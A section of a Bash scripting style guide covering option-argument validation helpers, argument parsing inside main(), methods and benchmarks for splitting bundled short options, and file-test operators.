The `-V`/`--version` option should output the script name followed by a space and the version number. Do **not** include the words "version", "vs", or "v" between them.

```bash
# ✓ Correct
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
# Output: myscript 1.2.3

# ✗ Wrong - do not include the word "version"
-V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
# Output: myscript version 1.2.3  (incorrect)
```

**Rationale:** This format follows GNU standards and is consistent with most Unix/Linux utilities (e.g., `bash --version` outputs "GNU bash, version 5.2.15", not "GNU bash version version 5.2.15").


---


**Rule: BCS0803**

## Argument Validation

**Use validation helpers to ensure option arguments exist and are valid types before processing.**

**Rationale:** Prevents silent failures, provides clear error messages, catches user mistakes (like `--output --verbose` where filename is missing), validates data types before use.

### Three Validation Patterns

**1. `noarg()` - Basic Existence Check**

Validates that an option has an argument following it.

```bash
noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }
```

**Usage:**
```bash
while (($#)); do case $1 in
  -o|--output)
    noarg "$@"      # Validate argument exists
    shift
    OUTPUT=$1       # Now safe to use $1
    ;;
esac; shift; done
```

**What it checks:**
- `(($# > 1))` - At least 2 arguments remain (option + value)
- `[[ ${2:0:1} != '-' ]]` - Next argument doesn't start with `-`

**2. `arg2()` - Enhanced Validation with Safe Quoting**

Enhanced version with better error messages using shell quoting (`${1@Q}`).

```bash
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

**Usage:**
```bash
while (($#)); do case $1 in
  -p|--prefix)
    arg2 "$@"       # Enhanced validation
    shift
    PREFIX=$1
    ;;
esac; shift; done
```

**Differences from `noarg()`:**
- Uses `${#@}-1<1` for argument count (explicit remaining args)
- Uses `${1@Q}` for safe parameter quoting in error message
- More concise error message format

**Benefits:**
- **Catches:** `script --output --verbose` (no filename provided)
- **Prevents:** Using next option as value
- **Safe quoting:** `${1@Q}` escapes special characters in error output

**3. `arg_num()` - Numeric Argument Validation**

Validates that an option's argument is a valid integer.

```bash
arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }
```

**Usage:**
```bash
while (($#)); do case $1 in
  -d|--depth)
    arg_num "$@"   # Validate numeric
    shift
    MAX_DEPTH=$1   # Guaranteed to be integer
    ;;
  -C|--context)
    arg_num "$@"
    shift
    CONTEXT_LINES=$1
    ;;
esac; shift; done
```

**What it validates:**
- Argument exists (`${#@}-1<1`)
- Argument matches integer pattern (`^[0-9]+$`)
- Rejects: negative numbers, decimals, non-numeric text

**Type safety benefit:**
```bash
# Without validation:
-d|--depth) shift; MAX_DEPTH=$1 ;;
# User types: script --depth abc
# Result: MAX_DEPTH='abc' → errors in arithmetic later

# With validation:
-d|--depth) arg2_num "$@"; shift; MAX_DEPTH=$1 ;;
# User types: script --depth abc
# Result: Immediate clear error: '--depth requires a numeric argument'
```

### Complete Example with All Three

```bash
declare -i MAX_DEPTH=5 VERBOSE=0
declare -- OUTPUT_FILE=''
declare -a INPUT_FILES=()

# Validation helpers
arg2() { ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]] && die 2 "${1@Q} requires argument" ||:; }

arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }

noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }

main() {
  while (($#)); do case $1 in
    -o|--output)
      arg2 "$@"                 # String validation
      shift
      OUTPUT_FILE=$1
      ;;

    -d|--depth)
      arg_num "$@"              # Numeric validation
      shift
      MAX_DEPTH=$1
      ;;

    -v|--verbose)
      VERBOSE=1                 # No argument needed
      ;;

    -h|--help)
      noarg "$@"                # Basic check (also valid)
      shift
      HELP_TOPIC=$1
      ;;

    -*)
      die 22 "Invalid option ${1@Q}"
      ;;

    *)
      INPUT_FILES+=("$1")       # Positional argument
      ;;
  esac; shift; done

  readonly -- OUTPUT_FILE MAX_DEPTH VERBOSE

  # ... rest of script
}

main "$@"
```

### Choosing the Right Validator

| Validator | Use Case | Example Options |
|-----------|----------|----------------|
| `noarg()` | Simple existence check | `-o FILE`, `-m MSG` |
| `arg2()` | String args, prevent `-` prefix | `--prefix PATH`, `--output FILE` |
| `arg_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT`, `-C NUM` |

### Anti-Patterns

```bash
# ✗ No validation - silent failure
-o|--output) shift; OUTPUT=$1 ;;
# Problem: --output --verbose → OUTPUT='--verbose'

# ✗ No validation - type error later
-d|--depth) shift; MAX_DEPTH=$1 ;;
# Problem: --depth abc → arithmetic errors: "abc: syntax error"

# ✗ Manual validation - verbose
-p|--prefix)
  if (($# < 2)); then
    die 2 "Option '-p' requires an argument"
  fi
  shift
  PREFIX=$1
  ;;
# Problem: Repetitive, verbose, inconsistent error messages

# ✓ Use helpers
-p|--prefix) arg2 "$@"; shift; PREFIX=$1 ;;
```

### Error Message Quality

**Note the `${1@Q}` pattern** used in `arg2()` and `arg2_num()`:

```bash
# User input: script '--some-weird$option' value
# With ${1@Q}: error: '--some-weird$option' requires argument
# Without:     error: --some-weird (crashes or expands $option)
```

See BCS04XX for detailed explanation of the `${parameter@Q}` shell quoting operator.

### Integration with Case Statements

These validators work seamlessly with the standard argument parsing pattern (BCS1001):

```bash
while (($#)); do case $1 in
  -d|--depth)     arg_num "$@"; shift; MAX_DEPTH=$1 ;;
  -v|--verbose)   VERBOSE=1 ;;
  -h|--help)      show_help; exit 0 ;;
  -[dvh]*)        set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              FILES+=("$1") ;;
esac; shift; done
```

**Critical:** Always call validator BEFORE `shift` - validator needs to inspect `$2`.


---


**Rule: BCS0804**

## Argument Parsing Location

**Recommendation:** Place argument parsing inside the `main()` function rather than at the top level.

**Benefits:**
- Better testability (can test `main()` with different arguments)
- Cleaner variable scoping (parsing vars are local to `main()`)
- Encapsulation (argument handling is part of main execution flow)
- Easier to mock/test in unit tests

```bash
# Recommended: Parsing inside main()
main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
      --prefix)     shift
                    PREFIX=$1
                    # Update derived paths
                    BIN_DIR="$PREFIX"/bin
                    LOADABLE_DIR="$PREFIX"/lib/bash/loadables
                    ;;
      -h|--help)    show_help
                    exit 0
                    ;;
      -*)           die 22 "Invalid option ${1@Q}"
                    ;;
      *)            >&2 show_help
                    die 2 "Unknown option ${1@Q}"
                    ;;
    esac
    shift
  done

  # Proceed with main logic
  check_prerequisites
  build_components
  install_components
}

main "$@"
#fin
```

**Alternative:** For very simple scripts (< 200 lines) without a `main()` function, top-level parsing is acceptable:

```bash
#!/bin/bash
set -euo pipefail

# Simple scripts can parse at top level
while (($#)); do case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option ${1@Q}" ;;
  *)            FILES+=("$1") ;;
esac; shift; done

# Rest of simple script logic
```



---


**Rule: BCS0805**

## Short-Option Disaggregation in Command-Line Processing Loops

## Overview

Short-option disaggregation is the process of splitting bundled short options (e.g., `-abc`) into individual options (`-a -b -c`) for processing in command-line argument parsing loops. This allows users to write commands like `script -vvn` instead of `script -v -v -n`, following standard Unix conventions.

This document provides a comprehensive analysis of three methods for implementing short-option disaggregation in Bash scripts, including performance benchmarks, implementation details, and practical examples.

## Why Disaggregation is Needed

Unix/Linux command-line conventions allow users to bundle single-character options:

```bash
# These should be equivalent:
ls -lha
ls -l -h -a

# These should be equivalent:
script -vvn file.txt
script -v -v -n file.txt
```

Without disaggregation support, your script would treat `-lha` as a single unknown option rather than three separate options (`-l`, `-h`, `-a`). Disaggregation makes your script user-friendly and compliant with Unix conventions.

## The Three Methods

### Method 1: grep (Current Standard and Recommended)

**Approach:** Use `grep -o .` to split characters

```bash
case $1 in
  # ...
  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up aggregated short options
    set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
    ;;
  # ...
esac
```

**How it works:**
1. `${1:1}` removes the leading dash from the option string
2. `grep -o .` outputs each character on a separate line
3. `printf -- "-%c "` adds a dash before each character
4. `set --` replaces the argument list with the expanded options
5. Leading empty string is added then removed to handle edge cases

**Pros:**
- Compact one-liner
- Standard approach used in most scripts
- Well-tested and reliable

**Cons:**
- Requires external `grep` command
- Slower performance (~190 iter/sec)
- Requires shellcheck disable for SC2046
- External process overhead

**Performance:** ~190 iterations/second

### Method 2: fold (Alternative)

**Approach:** Use `fold -w1` to split characters

```bash
case $1 in
  # ...
  -[amLpvqVh]*) #split up aggregated short options
    set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}"
    ;;
  # ...
esac
```

**How it works:**
1. `${1:1}` removes the leading dash
2. `fold -w1` wraps text at 1-character width (splits each char to its own line)
3. `printf -- "-%c "` adds a dash before each character
4. `set --` replaces the argument list

**Pros:**
- Slightly faster than grep (~3% improvement)
- More semantically correct (fold is designed for line wrapping)
- One-liner implementation

**Cons:**
- Still requires external command
- Still needs shellcheck disable
- Marginal performance improvement over grep
- External process overhead

**Performance:** ~195 iterations/second

### Method 3: Pure Bash

**Approach:** Use only bash built-ins for maximum performance

```bash
case $1 in
  # ...
  -[amLpvqVh]*) # Split up single options (pure bash)
    local -- opt=${1:1}
    local -a new_args=()
    while ((${#opt})); do
      new_args+=("-${opt:0:1}")
      opt=${opt:1}
    done
    set -- '' "${new_args[@]}" "${@:2}"
    ;;
  # ...
esac
```

**How it works:**
1. `opt=${1:1}` captures option string without leading dash
2. Initialize empty array `new_args=()`
3. Loop while option string has characters: `while ((${#opt}))`
4. Extract first character, prepend dash, append to array: `new_args+=("-${opt:0:1}")`
5. Remove first character from string: `opt=${opt:1}`
6. Replace argument list with expanded options

**Pros:**
- **68% faster** than grep/fold methods (~318 iter/sec)
- No external dependencies
- No shellcheck warnings needed
- More portable (works anywhere bash 4+ is available)
- No subprocess overhead

**Cons:**
- More verbose (6 lines vs 1 line)
- Slightly more complex logic

**Performance:** ~318 iterations/second

## Performance Comparison

**Benchmark Results (3-second test runs):**

| Method | Iterations | Iter/Sec | Relative Speed | External Deps | Shellcheck |
|--------|-----------|----------|----------------|---------------|------------|
| grep (current) | ~573 | 190.82 | Baseline | grep | SC2046 disable |
| fold | ~586 | 195.25 | +2.3% | fold | SC2046 disable |
| **Pure Bash** | **~954** | **317.75** | **+66.5%** | **None** | **Clean** |

**Key Finding:** Pure bash is approximately **68% faster** than external command methods, with no external dependencies and no shellcheck warnings.

## Complete Implementation Examples

### Example 1: Using grep (Current Standard)

```bash
#!/usr/bin/env bash
# My first script
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE...

Process files with various options.

Options:
  -o, --output FILE  Output file (required)
  -n, --dry-run      Dry-run mode
  -v, --verbose      Verbose output (stackable)
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -o output.txt file1.txt file2.txt
  $SCRIPT_NAME -vvno output.txt *.txt
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift; output_file=$1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;

    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;

    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support (grep method)
    -[onvqVh]*) #shellcheck disable=SC2046
                    set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option ${1@Q}" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  # Validate required arguments
  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  # Use parsed arguments
  ((VERBOSE)) && echo "Processing ${#files[@]} files" ||:
  ((DRY_RUN)) && echo "[DRY RUN] Would write to ${output_file@Q}" ||:

  # Process files
  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE > 1)) && echo "Processing ${file@Q}"
    # Processing logic here
  done

  ((VERBOSE)) && echo "Results would be written to ${output_file@Q}" ||:
}

main "$@"
#fin
```

### Example 2: Using fold

```bash
#!/usr/bin/env bash
# My first script
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i FORCE=0
declare -- config_file=''

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS]

Configuration manager.

Options:
  -c, --config FILE  Configuration file
  -v, --verbose      Verbose output
  -f, --force        Force operation
  -V, --version      Show version
  -h, --help         Show this help
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -c|--config)    (($#>0)) || die 22 "Option ${1@Q} requires argument"
                    shift
                    config_file=$1 ;;
    -f|--force)     FORCE=1 ;;

    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;

    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support (fold method)
    -[cfvqVh]*) #shellcheck disable=SC2046
                    set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option ${1@Q}" ;;
    *)              die 2 "Unexpected argument ${1@Q}" ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE FORCE config_file

  # Validate required arguments
  [[ -n "$config_file" ]] || die 2 'Configuration file required (use -c)'

  ((VERBOSE)) && echo "Using config ${config_file@Q}" ||:
  ((FORCE)) && echo '[FORCE MODE] Ignoring safety checks' ||:

  # Main logic here
}

main "$@"
#fin
```

### Example 3: Using Pure Bash

```bash
#!/usr/bin/env bash
# My first script
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i PARALLEL=1
declare -- mode='normal'
declare -a targets=()

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] TARGET...

Process targets with configurable parallelism.

Options:
  -m, --mode MODE    Processing mode (normal|fast|safe)
  -j, --parallel N   Number of parallel jobs (default: 1)
  -v, --verbose      Verbose output (stackable)
  -q, --quiet        Quiet mode (suppress normal output)
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -v target1 target2
  $SCRIPT_NAME -j4 -m fast target1 target2
  $SCRIPT_NAME -vvqj2 target1  # -q overrides -vv
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -m|--mode)      noarg "$@"; shift
                    mode=$1 ;;
    -j|--parallel)  noarg "$@"; shift
                    PARALLEL=$1 ;;

    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;

    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support (pure bash method)
    -[mjvqVh]*) # Split up single options (pure bash)
                    local -- opt=${1:1}
                    local -a new_args=()
                    while ((${#opt})); do
                      new_args+=("-${opt:0:1}")
                      opt=${opt:1}
                    done
                    set -- '' "${new_args[@]}" "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              targets+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE PARALLEL mode
  readonly -a targets

  # Validate arguments
  ((${#targets[@]} > 0)) || die 2 'No targets specified'
  [[ "$mode" =~ ^(normal|fast|safe)$ ]] || die 2 "Invalid mode: '$mode'"
  ((PARALLEL > 0)) || die 2 'Parallel jobs must be positive'

  # Use parsed arguments
  ((VERBOSE)) && {
    echo "Mode: $mode"
    echo "Parallel jobs: $PARALLEL"
    echo "Processing ${#targets[@]} targets"
  }

  # Process targets
  local -- target
  for target in "${targets[@]}"; do
    ((VERBOSE)) && echo "Processing '$target'"
    # Processing logic here
  done

  ((VERBOSE)) && echo "Complete"
}

main "$@"
#fin
```

## Usage Examples

All three methods support the same user-facing functionality:

```bash
# Single options
./script -v -v -n file.txt

# Bundled short options
./script -vvn file.txt

# Mixed bundled and separate
./script -vv -n file.txt

# Options with arguments cannot be bundled at the end
./script -vno output.txt file.txt  # -n -o output.txt

# Long options work normally
./script --verbose --verbose --dry-run file.txt

# Mixed long and short
./script -vv --dry-run -o output.txt file.txt
```

## Edge Cases and Considerations

### 1. Options Requiring Arguments

Options that take arguments cannot be in the middle of a bundle:

```bash
# ✓ Correct - option with argument at end or separate
./script -vno output.txt file.txt    # -v -n -o output.txt
./script -vn -o output.txt file.txt  # -v -n -o output.txt

# ✗ Wrong - option with argument in middle
./script -von output.txt file.txt    # Would try: -v -o -n output.txt
                                      # -o captures "n" as argument!
```

**Solution:** Document that options requiring arguments should be:
1. Placed at the end of a bundle
2. Used separately
3. Used with long-form (--output)

### 2. Character Set Validation

The pattern `-[amLpvqVh]*` explicitly lists valid options. This:
- Prevents incorrect disaggregation of unknown options
- Allows unknown options to be caught by the `-*)` case
- Documents which short options are valid

```bash
# Valid options explicitly listed
-[ovnVh]*)  # Only -o -v -n -V -h are valid short options

# If user provides invalid option
./script -xyz  # Doesn't match pattern, caught by -*) case
               # Error: Invalid option '-xyz'
```

### 3. Special Character Handling

Bash parameter expansion handles special characters correctly:

```bash
# These characters work correctly in pure bash method:
# Digits: -123 → -1 -2 -3
# Letters: -abc → -a -b -c
# Mixed: -v1n2 → -v -1 -n -2

# The grep/fold methods also handle these correctly
```

### 4. Empty String After Removal

All three methods use `set -- '' ...` followed by `shift` or explicit removal. This handles the edge case where no options are provided.

### 5. Performance Considerations

For scripts that:
- Process arguments frequently (loops, recursive calls)
- Need to start quickly (interactive tools)
- Run in resource-constrained environments

## Implementation Checklist

When implementing short-option disaggregation:

- [ ] List all valid short options in pattern: `-[ovnVh]*`
- [ ] Place disaggregation case before `-*)` invalid option case
- [ ] Ensure `shift` happens at end of loop for all cases
- [ ] Document which options can be bundled
- [ ] Warn users about options-with-arguments bundling limitations
- [ ] Add shellcheck disable comment for grep/fold methods
- [ ] Test with: single options, bundled options, mixed long/short
- [ ] Test with: options before/after positional arguments
- [ ] Verify stacking behavior for flags (e.g., `-vvv`)

## Performance Benchmark Script

The following script provides comprehensive performance testing of all three disaggregation methods:

```bash
#!/usr/bin/env bash
# Speed comparison test for option disaggregation methods
# Each test runs for at least 3 seconds
set -euo pipefail

error() { >&2 echo "$(basename -- "$0")" 'error:' "$*"; }

# Test input: 15 random alphanumeric characters
declare -- TEST_INPUT TEST_OUTPUT
TEST_INPUT="-$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c15 || true)"

# Generate expected output from TEST_INPUT
TEST_OUTPUT=()
declare -- opt="${TEST_INPUT:1}"
while ((${#opt})); do
  TEST_OUTPUT+=("-${opt:0:1}")
  opt="${opt:1}"
done

# Method 1: Original (grep)
method_grep() {
  local -- input=${1:1}
  shift
  set -- '' $(printf -- "-%c " $(grep -o . <<<"$input")) "$@"
  shift  # Remove leading empty string
}

# Method 2: fold -w1
method_fold() {
  local -- input=${1:1}
  shift
  set -- '' $(printf -- "-%c " $(fold -w1 <<<"$input")) "$@"
  shift  # Remove leading empty string
}

# Method 3: Pure bash
method_bash() {
  local -- input=$1
  local -- opt=${input:1}
  shift
  local -a new_args=()
  while ((${#opt})); do
    new_args+=("-${opt:0:1}")
    opt=${opt:1}
  done
  set -- "${new_args[@]}" "$@"
}

# Verification function using inline logic
verify_grep() {
  local -a result
  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${TEST_INPUT:1}"))
  shift
  result=("$@")

  if [[ "${#result[@]}" -ne "${#TEST_OUTPUT[@]}" ]]; then
    error "grep produced ${#result[@]} args, expected ${#TEST_OUTPUT[@]}"
    return 1
  fi

  local -i i
  for ((i=0; i<${#TEST_OUTPUT[@]}; i+=1)); do
    if [[ "${result[$i]}" != "${TEST_OUTPUT[$i]}" ]]; then
      error "grep arg $i mismatch: '${result[$i]}' != '${TEST_OUTPUT[$i]}'"
      return 1
    fi
  done
  echo "✓ Original (grep) output verified"
}

verify_fold() {
  local -a result
  set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${TEST_INPUT:1}"))
  shift
  result=("$@")

  if [[ "${#result[@]}" -ne "${#TEST_OUTPUT[@]}" ]]; then
    error "fold produced ${#result[@]} args, expected ${#TEST_OUTPUT[@]}"
    return 1
  fi

  local -i i
  for ((i=0; i<${#TEST_OUTPUT[@]}; i+=1)); do
    if [[ "${result[$i]}" != "${TEST_OUTPUT[$i]}" ]]; then
      error "fold arg $i mismatch: '${result[$i]}' != '${TEST_OUTPUT[$i]}'"
      return 1
    fi
  done
  echo "✓ Option 1 (fold) output verified"
}

verify_bash() {
  local -- opt=${TEST_INPUT:1}
  local -a result=()
  while ((${#opt})); do
    result+=("-${opt:0:1}")
    opt=${opt:1}
  done

  if [[ "${#result[@]}" -ne "${#TEST_OUTPUT[@]}" ]]; then
    error "pure bash produced ${#result[@]} args, expected ${#TEST_OUTPUT[@]}"
    return 1
  fi

  local -i i
  for ((i=0; i<${#TEST_OUTPUT[@]}; i+=1)); do
    if [[ "${result[$i]}" != "${TEST_OUTPUT[$i]}" ]]; then
      error "pure bash arg $i mismatch: '${result[$i]}' != '${TEST_OUTPUT[$i]}'"
      return 1
    fi
  done
  echo "✓ Option 3 (pure bash) output verified"
}

# Test runner function
run_test() {
  local -- method_name=$1
  local -- method_func=$2

  echo "Testing: $method_name"
  echo "----------------------------------------"

  # Calculate iterations needed
  local -i iterations=0
  local -- current_time='' elapsed=''
  local -- start_time="${EPOCHREALTIME}"

  # Warm-up and calibration run
  while ((1)); do
    $method_func "$TEST_INPUT" arg1 arg2 arg3 >/dev/null 2>&1
    iterations+=1

    current_time="${EPOCHREALTIME}"
    elapsed=$(awk "BEGIN {print $current_time - $start_time}")

    # Check if we've exceeded 3 seconds
    if (( $(awk "BEGIN {print ($elapsed >= 3.0)}") )); then
      break
    fi
  done

  echo "Iterations: $iterations"
  echo "Elapsed time: ${elapsed}s"
  echo "Iterations/sec: $(awk "BEGIN {printf \"%.2f\", $iterations / $elapsed}")"
  echo ""
}

# Main test execution
echo "========================================"
echo "Option Disaggregation Speed Test"
echo "========================================"
echo "Test input: $TEST_INPUT (${#TEST_INPUT} chars, $((${#TEST_INPUT} - 1)) options)"
echo "Minimum test duration: 3.0000 seconds"
echo ""

# Source timer for use
source timer 2>/dev/null || {
  error 'timer not found or cannot be sourced'
  exit 1
}

# Verify all methods produce correct output
echo "Verifying method correctness..."
echo "Expected output: ${TEST_OUTPUT[*]}"
echo
verify_grep || exit 1
verify_fold || exit 1
verify_bash || exit 1
echo

# Run tests
timer -f bash -c "$(declare -f method_grep run_test); run_test 'Original (grep)' method_grep"
timer -f bash -c "$(declare -f method_fold run_test); run_test 'Option 1 (fold)' method_fold"
timer -f bash -c "$(declare -f method_bash run_test); run_test 'Option 3 (pure bash)' method_bash"

echo "========================================"
echo "Test complete"
echo "========================================"

#fin
```

### Running the Benchmark

```bash
# Save as speedtest.sh and make executable
chmod +x speedtest.sh

# Run the benchmark
./speedtest.sh
```

### Sample Output

```
========================================
Option Disaggregation Speed Test
========================================
Test input: -sJD2Vle76LlfR2J (16 chars, 15 options)
Minimum test duration: 3.0000 seconds

Verifying method correctness...
Expected output: -s -J -D -2 -V -l -e -7 -6 -L -l -f -R -2 -J

✓ Original (grep) output verified
✓ Option 1 (fold) output verified
✓ Option 3 (pure bash) output verified

Testing: Original (grep)
----------------------------------------
Iterations: 573
Elapsed time: 3.00276s
Iterations/sec: 190.82

Testing: Option 1 (fold)
----------------------------------------
Iterations: 586
Elapsed time: 3.00123s
Iterations/sec: 195.25

Testing: Option 3 (pure bash)
----------------------------------------
Iterations: 954
Elapsed time: 3.00239s
Iterations/sec: 317.75

========================================
Test complete
========================================
```

## Recommendations

### Recommendation

**Keep Current Method (grep) Unless:**
1. Performance is critical
2. Script is called frequently
3. External dependencies are a concern
4. Running in restricted environment

### For High-Performance Scripts

**Always Use Pure Bash Method**

Scripts that should prioritize performance:
- Called in tight loops
- Part of build systems
- Interactive tools (tab completion, prompts)
- Running in containers/restricted environments
- Called thousands of times per session

## Testing Your Implementation

### Basic Functionality Test

```bash
# Test single options
./script -v -v -n file.txt

# Test bundled options
./script -vvn file.txt

# Test mixed
./script -v --verbose -n file.txt

# Test with arguments
./script -vno output.txt file.txt

# Test invalid options
./script -xyz  # Should error

# Test option stacking
./script -vvvvv  # VERBOSE should be 5
```

### Automated Test Suite

```bash
#!/usr/bin/env bash
# test-option-bundling.sh

test_bundling() {
  local -- description=$1
  shift
  echo "Testing: $description"

  # Run your script with provided arguments
  output=$(./your-script "$@" 2>&1)

  # Verify output matches expectations
  # Add your verification logic here

  echo "  ✓ Passed"
}

# Test cases
test_bundling "Single options" -v -v -n file.txt
test_bundling "Bundled options" -vvn file.txt
test_bundling "Mixed long/short" -v --verbose -n file.txt
test_bundling "Options with args" -vno output.txt file.txt

echo "All tests passed!"
```

## Conclusion

Short-option disaggregation is essential for creating user-friendly command-line tools that follow Unix conventions. While all three methods produce identical results, the pure bash method offers significant performance advantages with no external dependencies.

**Summary:**
- **grep method:** Recommended, Current standard, external dependency, ~190 iter/sec
- **fold method:** Marginal improvement, external dependency, ~195 iter/sec
- **Pure bash:** No dependencies, ~318 iter/sec (68% faster)



---


**Rule: BCS0900**

# File Operations

This section establishes safe file handling practices to prevent common pitfalls in shell scripting. It covers proper file testing operators (`-e`, `-f`, `-d`, `-r`, `-w`, `-x`) with explicit quoting requirements, safe wildcard expansion patterns that always use explicit paths (`rm ./*` never `rm *`), process substitution techniques (`< <(command)`) for avoiding subshell variable issues when reading command output, and here document patterns for multi-line input. These defensive programming practices prevent accidental file deletion, handle special characters safely, and ensure reliable file operations across different environments.


---


**Rule: BCS0901**

## Safe File Testing

**Always quote variables and use `[[ ]]` for file tests:**

```bash
# Basic file testing
[[ -f "$file" ]] && source "$file"
[[ -d "$path" ]] || die 1 "Not a directory ${path@Q}"
[[ -r "$file" ]] || warn "Cannot read ${file@Q}"
[[ -x "$script" ]] || die 1 "Not executable ${script@Q}"

# Check multiple conditions
if [[ -f "$config" && -r "$config" ]]; then
  source "$config"
else
  die 3 "Config file not found or not readable ${config@Q}"
fi

# Check file emptiness
[[ -s "$logfile" ]] || warn 'Log file is empty'

# Compare file timestamps
if [[ "$source" -nt "$destination" ]]; then
  cp "$source" "$destination"
  info "Updated $destination"
fi
```

**Complete file test operators:**

| Operator | Returns True If |
|----------|----------------|
| `-e file` | File exists (any type) |
| `-f file` | Regular file exists |
| `-d dir` | Directory exists |
| `-L link` | Symbolic link exists |
| `-p pipe` | Named pipe (FIFO) exists |
| `-S sock` | Socket exists |
| `-b file` | Block device exists |
| `-c file` | Character device exists |

**Permission and attribute tests:**

| Operator | Returns True If |
|----------|----------------|
| `-r file` | File is readable |
| `-w file` | File is writable |
| `-x file` | File is executable |
| `-s file` | File is not empty (size > 0) |
| `-u file` | File has SUID bit set |
| `-g file` | File has SGID bit set |
| `-k file` | File has sticky bit set |
| `-O file` | You own the file |
| `-G file` | File's group matches yours |
| `-N file` | File modified since last read |

**File comparison operators:**

| Operator | Returns True If |
|----------|----------------|
| `file1 -nt file2` | file1 is newer than file2 (modification time) |
| `file1 -ot file2` | file1 is older than file2 |
| `file1 -ef file2` | file1 and file2 have same device and inode (same file) |

**Rationale:**

- **Always quote**: `"$file"` prevents word splitting and glob expansion
- **Use `[[ ]]`**: More robust than `[ ]` or `test` command
- **Test before use**: Prevents errors from missing/unreadable files
